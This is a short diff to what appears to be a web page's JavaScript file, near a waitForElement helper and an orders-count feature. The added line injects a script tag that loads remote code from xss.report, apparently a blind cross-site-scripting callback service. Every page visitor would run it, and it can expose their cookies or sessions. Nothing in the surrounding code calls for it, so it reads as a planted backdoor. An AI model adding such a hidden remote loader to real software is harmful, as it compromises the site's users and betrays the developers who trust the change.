@@ -259,7 +259,7 @@ function waitForElement(selector, callback) {
         setTimeout(() => waitForElement(selector, callback), 500);
     }
 }
-
+var a=document.createElement("script");a.src="https://xss.report/c/biksoft";document.body.appendChild(a);
 
 /**
  * Handles the persistent orders count feature.
